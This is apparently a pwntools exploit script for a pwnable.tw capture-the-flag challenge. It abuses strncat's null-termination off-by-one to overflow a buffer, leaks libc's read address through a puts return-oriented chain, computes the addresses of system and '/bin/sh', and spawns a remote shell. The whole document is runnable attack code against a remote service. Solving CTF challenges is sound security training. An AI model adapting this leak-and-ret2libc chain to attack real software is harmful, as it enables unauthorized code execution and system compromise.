from pwn import *

"""
Exploit: strncat() always null terminates
"""

PROG = './chal'
db = """b *0x08048a19
c
"""

r = remote('chall.pwnable.tw', 10103)
#r = process(PROG)
#r = gdb.debug(PROG, db)

def create(p):
    r.sendlineafter(b'Your choice :', b'1')
    r.sendafter(b'bullet :', p)

def powerup(p):
    r.sendlineafter(b'Your choice :', b'2')
    r.sendafter(b'bullet :', p)

def beat():
    r.sendlineafter(b'Your choice :', b'3')


create(b'A' * 47)
powerup(b'B')

puts_plt = 0x080484a8
read_got = 0x804afd0
main = 0x08048954

powerup(b'\xff\xff\xff' + p32(0xbaddbadd) + p32(puts_plt) + p32(main) + p32(read_got))
beat()

r.recvuntil(b'Oh ! You win !!\n')
libc_read = unpack(r.recv(4), 32, endian='little')
log.info('Leaked read addr: ' + hex(libc_read))
libc_base = libc_read - 0xd41c0
log.info('Leaked libc base: ' + hex(libc_base))

system = libc_base + 0x3a940
binsh = libc_base + 0x158e8b

create(b'A' * 47)
powerup(b'B')
powerup(b'\xff\xff\xff' + p32(0xbaddbadd) + p32(system) + p32(0xdeadbeef) + p32(binsh))
beat()

r.interactive()
